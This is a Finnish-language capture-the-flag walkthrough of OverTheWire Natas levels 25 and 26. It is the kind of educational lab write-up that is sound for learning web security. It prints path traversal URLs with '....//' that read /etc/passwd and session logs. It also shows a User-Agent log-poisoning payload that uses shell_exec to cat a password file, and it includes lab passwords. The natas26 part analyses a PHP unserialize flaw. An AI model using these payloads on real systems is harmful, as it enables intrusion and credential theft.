# natas 25 - START HERE;

Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws


Ensimmäisen kirjauduttua joku lorem ipsum quote runoilu sivusto, ja siinä voi valita kielensä et menee joko oletuksena (eng) tai vaihtaa to saksan kieleksi. 

![alt text](./kuvat-level22-28/natas25-0.png)


**view-source.html** koodissa on ainakin muutama funktio, josta koskien tämä pieni runoilu teksit säkeistöstä että sallii vaihtakielensä ja oletuksena se on englanniksi.

Tässä on jotakin vinkkejä annettu koskien "directory traversal attempt" , ja tiedostojen polku tyyppiä, että tekee funktioiden tarkistusta ja palauttamista, että sen korvaamisen suojaa tiedostopolkua.

🕵️‍♂️ logRequest()-funktio tallentaa session-tunnukseen perustuvan lokin tiedostoon, mikä on selvä vihje, että lokien polku voi paljastaa salaisuuksia. just tämä `/var/www/natas...`.

Erikseen on funktio kirjauttumisen pyyntö viesti, että annettu tällainen polku vinkkinä:

```
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```

![alt text](./kuvat-level22-28/natas25-1.png)


Tämä Natas25 taso liittyy vahvasti haavoittuvuuteen nimeltä local file inclusion (LFI) ja mahdolliseen session-id -manipulointiin. Session-id kenttään tulee toi kirjautuneen evästeen PHPSESSID value. Sekä tässä lokituksessa ($log) termistössä on mainintana date (päiväys ja kellonaikakin), että normi lokituksen dataa.

Tässä kun valitsee kielensä esim. eng tai tanskaksi se kyllä muuttaa samantien sivuston URL perään `/?lang=en` ja sama pätee saksaksi `/?lang=de`- tämä voi kertoa jotakin tulostuksena tiedoston polkua.


Tässä alemmassa funktiossa, niin tässä tapahtuu **bypassing the ../ check** osa. Ainakin tässä mainuttu on tiedoston polku ja monta mahtaa olla kyseessä? Kokeillaan laitaa muutama piste ja kautakauta  että antaako mitään eli `....//`.


- Tässä `$filename, "../"` 

```
// check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
```

🔐 Mitä funktiossa tapahtuu?

PHP-koodissa yritetään suojautua hakemistohyökkäyksiltä (directory traversal) — eli tilanteilta, joissa käyttäjä yrittää päästä käsiksi tiedostoihin menemällä takaisin hakemistorakenteessa `../.`

🚧 Miksi tämä ei riitä?
Kirjoittaja kertoo, että vaikka `../` poistetaan, on mahdollista kiertää suoja käyttämällä erikoismuotoa: `....//`

Koodi yrittää estää tiedostojen luvattoman lukemisen poistamalla `../`, mutta fiksu hyökkääjä voi kiertää tämän käyttämällä `....//`, joka toimii samoin mutta ei jää suodatukseen kiinni.

Tämä on klassinen esimerkki siitä, miten **suodatus ei riitä** — pitää käyttää esim. **täydellistä polun normalisointia tai whitelist-pohjaista sisällytystä.**


## kali linux - START HERE;

Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws

Tämä voisi olla hyvä alku pohja checkkaus et ottaa ton kirjautuneen evästeen datansa eli (F12 --> application --> cookies / <http://natas-pitkä-url> --> PHPSESSID <value>)


1. Hyödynnettään `session_id()` - pohjaista tiedostopolkua

PHP tallentaa session-tiedisto polkuun kuten: **/var/www/natas/natas25/logs/natas25_<session_id>.log
** 

Kokeillaan jotakin lokitiedosotn sisältö ja joskus sieltä voi löytyä salasanansa tai muuta hyödyllistä dataa ja pyörittäen tätä curl komento pohjaa:

```
curl "http://natas25.natas.labs.overthewire.org/?lang=.../logs/natas25_<session_id>.log" \
  --user natas25:<salasana> \
  --cookie "PHPSESSID=<session_id>"

```


Toinen esim. kokeilla directory traversal hyökkäystä:

`curl "http://natas25.natas.labs.overthewire.org/?lang=../../../../etc/passwd" \
  --user natas25:<salasana>`


Tai lukea natas salasanoja:
`curl "http://natas25.natas.labs.overthewire.org/?lang=../../../../natas_webpass/natas25" \
  --user natas25:<salasana>`


**URL kautta:**

Voit testata molempia hyökkäystapoja myös suoraan selaimen URL-riviltä, aivan kuten curl tekee komentoriviltä

🌐 1. Lang-parametrin kautta tiedoston lukeminen selaimella:
`http://natas25.natas.labs.overthewire.org/?lang=.../logs/natas25_7cbgukbicl92os5d1a9icj81l5.log`

Kirjautuneena selaimessa, evästeet kulkevat automaattisesti → ei tarvitse syöttää käyttäjää/salasanaa manuaalisesti

🔐 2. Sama idea kuin curl, mutta selaimen kautta

curl vain tekee saman HTTP-pyynnön komentoriviltä — mutta URL:in rakenne on täsmälleen sama kuin selainkäytössä.

ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws

```
curl "http://natas25.natas.labs.overthewire.org/?lang=.../logs/natas25_<abd_value>.log" \
  --user natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws \
  --cookie "PHPSESSID=<abcd_value>"
```

`http://natas25.natas.labs.overthewire.org/?lang=.../logs/natas25_abcd1234.log`


Tässä testailin normaalisti se polku, että muutama piste piste `../` sitten etc - joka antoi oletuksena tämä etusivun Quote runoilu tekstinsä.
![alt text](./kuvat-level22-28/natas25-2.png)


Jos istuntosi on aktiivinen ja eväste mukana, saat saman tuloksen kuin curlilla

```
┌──(kali㉿kali)-[~]
└─$ curl "http://natas25.natas.labs.overthewire.org/?lang=../../../../etc/passwd" \
  --user natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" };</script></head>
<body>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

<h2>Quote</h2><p align="justify">You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.<div align="right"><h6>Scientist, Bad Boy Bubby</h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>


┌──(kali㉿kali)-[~]
└─$ curl "http://natas25.natas.labs.overthewire.org/?lang=.../logs/natas25_7cbgukbicl92os5d1a9icj81l5.log" \
  --user natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws \
  --cookie "PHPSESSID=7cbgukbicl92os5d1a9icj81l5"     
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" };</script></head>
<body>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

<h2>Quote</h2><p align="justify">You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.<div align="right"><h6>Scientist, Bad Boy Bubby</h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
``` 

Vähä lyhyempi curl komento, mutta automaattisesti saattaa valita pitkän komennon ja normi checkkaus:

```
┌──(kali㉿kali)-[~]
└─$ curl -i --user natas25:7cbgukbicl92os5d1a9icj81l5 "http://natas25.natas.labs.overthewire.org/"          
HTTP/1.1 401 Unauthorized
Date: Wed, 23 Jul 2025 16:29:06 GMT
Server: Apache/2.4.58 (Ubuntu)
WWW-Authenticate: Basic realm="Authentication required"
Content-Length: 481
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at natas25.natas.labs.overthewire.org Port 80</address>
</body></html>

┌──(kali㉿kali)-[~]
└─$ curl http://natas25.natas.labs.overthewire.org/ --user natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws          

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" };</script></head>
<body>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

<h2>Quote</h2><p align="justify">You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.<div align="right"><h6>Scientist, Bad Boy Bubby</h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ curl http://natas25.natas.labs.overthewire.org/?lang=....// --user natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" };</script></head>
<body>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

<br />
<b>Warning</b>:  include(/var/www/natas/natas25): failed to open stream: No such file or directory in <b>/var/www/natas/natas25/index.php</b> on line <b>38</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'language/../' for inclusion (include_path='.:/usr/share/php') in <b>/var/www/natas/natas25/index.php</b> on line <b>38</b><br />
<br />
<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
<h2></h2><br />
<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
<p align="justify"><br />
<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
<div align="right"><h6></h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

```

---

## UI selain kautta - START HERE;

- http://natas25.natas.labs.overthewire.org/?lang=....//....//
- http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//etc/passwd

Alkuun kokeilin lyhyemmällä, että mitä se antoi, mutta kyllä alkoi pelittääkin ja jopa päästään selvittää se viimeiseen maaliin astikin.
![alt text](./kuvat-level22-28/natas25-3.png)

![alt text](./kuvat-level22-28/natas25-4.png)

Tässä ainakin päästiin polkuun `/etc/passwd`, jossa on erilaisia käyttäjiä ja just nämä natas tasoiden tyyppiä ja sen hakemistojen tiedostoa.

![alt text](./kuvat-level22-28/natas25-5.png)

![alt text](./kuvat-level22-28/natas25-6.png)



Seuraavaksi otettaan tämä funktio osuus kuitenkin huomioina ja se polku osuus ja sitä haluttaan lisätä siihen url perään ja pätee toi evästeen PHPSESSID <value> ja kirjautuneen value id. - Toi on se vihje eli sijoitettaan se 

```
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```

Otin tämän siis just sillä hetkisen istunnon natas25 levelin eväste PHPSESSID arvonsa:
- PHPSESSID value: 7cbgukbicl92os5d1a9icj81l5

- http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_7cbgukbicl92os5d1a9icj81l5.log

Sama pätee jos se PHPSESSID eväste arvo muuttuu niin kannattaa muuttaa sitä ja päivittää sivustonsa, mutta seuraavassa kappaleessa tapahtuu **Burp suite** ohjelma Kali linux ohjelman alla. 

- PHPSESSID value: m82if8u2gmmdqdirqfhmol20ao

- http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_m82if8u2gmmdqdirqfhmol20ao.log

Tässä laitoin perään vähä lisää, mutta otin vihjeen siitä ylhäällä olevan funktion `fd=open` osuuden polun vinkkiä ja voiko vielä avautua seuraava tason salasana, mutta ei mutta hyvä yrittää ja testatakin. Tosiaan tässä URL tapahtuu: `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_m82if8u2gmmdqdirqfhmol20ao.log`: 
- Tässä URL perässä lukee polku `/var/www/natas/natas25/`
- log - lokitukset
- natas_<cookies-value-arvo>.log
  
![alt text](./kuvat-level22-28/natas25-7.png)

---


## Burp Suite - START HERE;

Perus haettu netistä lisätietoa ja vinkkiä miten saa tämän natas26 salasansa selvitettyä, mutta menttin tämän kautta ja on mahdollista mennä muulla keinolla ja netistä löytyy vihjeitä.

Tässä takana toi "request" sivusto jossa kävin oli tämä : `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_m82if8u2gmmdqdirqfhmol20ao.log` - ja riittää avaa burp suite oman selaimen ja tekee selain päivityksensä, ja älä unohda kirjautua. 

Seuraavaksi oikea klikkaus ja tarvitaan tämä "send to repeater" - koska lähetettään HTTP pyyntöä.

![alt text](./kuvat-level22-28/natas25-8.png)

Sitten se repeater pyyntö tulee tänne.

![alt text](./kuvat-level22-28/natas25-9.png)


Tässä (alempi kuva) - lisäsin request koodi rivinsä yhteen kuin: 
`<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>` ja riittää kumoo **User-Agent:** olevat tekstit ja lisää tämä siihen perään.

**PIENI HUOMOINA**: tässä seuraavista osa kuvista osassa epäonnistunut saamaan natas26 salasansa, että menee väärin ja hyvä harjoitus kuitenkin.

![alt text](./kuvat-level22-28/natas25-10.png)

Tässä siis lähetin send, mutta tuli pientä ongelmia en tiedä miksi ei tullut muutosta 

![alt text](./kuvat-level22-28/natas25-11.png)


![alt text](./kuvat-level22-28/natas25-12.png)

![alt text](./kuvat-level22-28/natas25-13.png)

Jotenkin ainakin tässä tuli tuloksena (oikealle), mutta tuosta kopsatusta tekstistä ei ollut ainakaan vastaus

![alt text](./kuvat-level22-28/natas25-14.png)

**Nyt tässä**, alkoi pelittää koska otin uuden **cookies** evästeen arvonsa ja korvasin sen tuhon pyyntöön, jotta se lähettää sen uudestaan ja **reponse** ikkunassa antoi kyllä, mutta halusin myös nähdä sen virallisen vastauksena tässä **Burp suite** omassa selaimessa ja kyllä pelitti nyt!!

Tämä on se vastaus ja alemmassa kuvassa on sama dejavu toisto:

```

[24.07.2025 09::36:04] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Directory traversal attempt! fixing request." [24.07.2025 09::36:47] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36 "Directory traversal attempt! fixing request." 

[24.07.2025 09::37:16] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Directory traversal attempt! fixing request." [24.07.2025 09::37:37] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36 "Directory traversal attempt! fixing request." 
[24.07.2025 09::38:23] "Directory traversal attempt! fixing request."

[24.07.2025 09::47:51] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Directory traversal attempt! fixing request." [24.07.2025 09::48:18] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36 "Directory traversal attempt! fixing request." [24.07.2025 09::48:50] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36 "Directory traversal attempt! fixing request."
```

![alt text](./kuvat-level22-28/natas25-15.png)

---


# natas 26 - START HERE;

password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE

X1 , Y1, X2 ja Y2 lomakekenttä tyyppinen ja sitten DRAW? 

![alt text](./kuvat-level22-28/natas26-0.png)

![alt text](./kuvat-level22-28/natas26-1.png)

Funktio lukee ja tallentaa x1, y1, x2, y2 arvot yhteen objektiin, mutta ei tee suoraa täsmennystä niiden välillä.

```
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>
```

Testasin jotakin satunnaista, että ainakin antoi tällaisen warning ilmoituksensa

**Warning: imageline() expects parameter 2 to be int, string given in /var/www/natas/natas26/index.php on line 80** - ja tämä voi olla koskien tiedoston polkun hakemistoa eli */var/www/natas/natas26/index.php*

![alt text](./kuvat-level22-28/natas26-2.png)

![alt text](./kuvat-level22-28/natas26-3.png)


## Pientä pohdintaa ja koodin tarkistamisesta - START HERE

Tässä siis ideana X1, X2 ja Y1 , Y2 lähettää pari viivjoen piirtämistä. Jokainen uusi pari lisätään edelisiin viivoihin. 

Kokeilin aluks 3 , 5 , 7 ja 11 - josta ainakin tuli pieni viiva , sitten toisen kerran testasin 50, 70, 80 ja 100 ,josta ainakin piirsi toisen viivan - ja voi olla joka kerta piirtää omansa uuden viivan erikseen.

![alt text](./kuvat-level22-28/natas26-4.png)

![alt text](./kuvat-level22-28/natas26-5.png)

Tässä ainakin session start siis istunnon alkamisessa on if-else koskien tuota virallisesta natas26 harjoituksen evästettä. Käyttäjän piirtotiedot tallennetaan evästeeseen ja haetaan sieltä seuraavilla sivulatauksilla. Käyttämällä session_id() kuva tallennetaan jokaiselle käyttäjälle erikseen → tosi fiksu tapa tehdä henkilökohtaisia piirroksia.

Evästeeseen tallennetaan useita piirto-objekteja, joista kukin on yksi viiva kahden pisteen välillä. Tämä mahdollistaa monivaiheisen piirtämisen. Tallentaa käyttäjän syöttämät koordinaatit evästeeseen uudeksi piirto-objektiksi.

tiivistettynä: Jos käyttäjällä on "drawing"-eväste tai antaa 4 koordinaattiarvoa URL:iin, koodi piirtää kuvan, näyttää sen ja tallentaa datan tiedostoon, joka perustuu istunnon tunnukseen.

```
<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>
```


Seuraavaksi nyt alemmassa tapahtuu `drawImage()` ja `showImage()` nin tämä on simppelisti tarkistaa ykinkertaisesti tiedostonnimen olemassaolon. drawImage - tarkoittaa luo laatikonsa ja kutsuu sitten `drawFromUserData` funktiota enenn PNG-kuvan luomista tiedostosta.


```
    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

```


`drawFromUserData` - funktio osuus.

Jos x1, y1, x2, ja y2 -avaimet löytyvät POST- tai GET-pyynnöstä, koodi piirtää viivan niiden välillä ja tallentaa sen session pohjalta nimettyyn kuvaan.

Jos käyttäjän evästeessä (cookie) on avain drawing, koodi purkaa sen (unserialize) ja käyttää evästeessä olevia koordinaatteja (x1, y1, x2, y2) viivan piirtämiseen.

Molemmat tavat johtavat siihen, että koodi rakentaa kuvan polun session ID:n mukaan, sitten kutsuu drawImage(), showImage() ja storeData().

💡 Tämä tarkoittaa, että väärin muotoiltu tai manipuloitu "drawing"-eväste voi johtaa unserialize-haavoittuvuuteen, jos sisältö ei ole odotettua. Siksi evästeen sisältö kannattaa tutkia tarkasti.


```
    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);

                    }
        }
    }
```


seuraavaksi `storeData()` funktio osuus, jossa tämä funktio on se kuinka `POST` data tekee sen `$_COOKIE` vaihtelevaksi muuttujaksi.

Kun taulukon avaimet x1, y1, x2, ja y2 ovat saatavilla (esimerkiksi POST-data), niistä luodaan uusi olio ($new_object), joka kuvaa yhtä viivaa.

Jos käyttäjän evästeessä on jo olemassa drawing-arvo, se puretaan (unserialize) ja tallennetaan muuttujaan $drawing. Tämä sisältää aiemmat viivat.

Purettua $drawing-taulukkoa päivitetään lisäämällä uusi $new_object siihen — eli yhdistetään vanhoja ja uusia viivoja yhteen.

Näin voidaan rakentaa moniosainen viiva tai useamman segmentin kokonaisuus, joka tallentuu $drawing-muuttujaan.

🧠 Tämä mahdollistaa sen, että käyttäjä voi piirtää useita viivoja, ja eväste säilyttää koko sarjan viivoja yksittäisen muuttujan kautta.

```
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
```


Viimeisenä luokkitus **The Logger Class**.

Tämä Logger-luokka on rakennettu kirjoittamaan lokitiedosto `/tmp`-hakemistoon, käyttäen tiedostonimeä, joka perustuu parametrina annettuun `$file`-arvoon.

Olio toimii myös destruktorin kautta – tämä on juuri se, mitä hyödynnetään serialisointihaavoittuvuudessa.

💥 Haavoittuvuus: Koska luokka sisältää __destruct-menetelmän ja tallentaa tiedostonimen parametrina ilman kunnollista validointia, se voi olla altis PHP object deserialization -hyökkäykselle. Jos käyttäjä pystyy unserialize()-toiminnolla syöttämään räätälöidyn Logger-olion, se voi johtaa ei-toivottuun tiedoston kirjoitukseen tai jopa tiedoston korvaamiseen.

**Luokan toiminta:**

- `__construct()`: avaa lokitiedoston ja kirjoittaa "#--session started--#" 
- `log($msg)`: lisää rivin tiedostoon
- `__destruct()`: kirjoittaa "#--session end--#" kun olio tuhotaan


```
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }
```

## Haavoittuvuus 

Tässä natas26 levelissä on **PHP object deserialization vulnerability** eli PHP -olion purkuun liittyvä haavoittuvuus.


- object deserialization: haavoittuvuuden osa - ei tarkistusta evässteen `unserialize()`- kohdassa ja hyödynnettävä osa: `Logger` luokan destruktori.
- Arbitrary file write: haavoittuvuuden osa - kirjoittaa tiedostoon käyttäjä ohjaamana ja hyödynnettävä osa: `$logFile`- polku.


Eli sivusto käyttää PHP:n unserialize()-toimintoa purkaakseen käyttäjän evästeestä tulevan datan – ja se tekee sen **ilman mitään tarkistusta**. Käyttäjä saa siis antaa suoraan olion, ja kun se puretaan, PHP voi suorittaa olion sisällä olevia "taikametodeja", kuten `__destruct()`.


Ja nyt se juttu: sivustolla on valmiiksi käytössä luokka nimeltä Logger, jossa on tämä `__destruct()`-metodi, joka kirjoittaa tiedoston palvelimelle. Käyttäjä pystyy ohjaamaan:

- minne tiedosto tallennetaan
- mitä tiedoston sisältöön kirjoitetaan (esim. PHP-koodia)

Eli haavoittuvuus syntyy siitä, että käyttäjä voi: ➡️ lähettää omaa koodia evästeen kautta ➡️ saada sen purettua oliona palvelimella ➡️ ja pakottaa palvelimen kirjoittamaan oman tiedoston, joka voidaan suorittaa myöhemmin

